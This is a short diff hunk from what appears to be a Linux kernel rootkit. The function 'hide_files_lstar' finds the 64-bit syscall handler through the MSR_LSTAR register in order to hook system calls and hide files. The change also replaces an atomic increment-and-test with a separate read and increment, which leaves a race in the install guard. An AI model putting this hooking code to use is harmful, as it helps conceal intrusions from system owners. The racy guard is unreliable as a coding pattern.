@@ -47,7 +47,8 @@ static unsigned long old_off;
 void
 hide_files_lstar(void)
 {
-    if (atomic_inc_return(&syscall64_install_count) == 1) {
+    if (atomic_read(&syscall64_install_count) == 0) {
+        atomic_inc(&syscall64_install_count);
         atomic_set(&syscall64_count, 0);
         syscall_64_ptr = find_do_syscall_64((char *)read_msr(MSR_LSTAR));
 
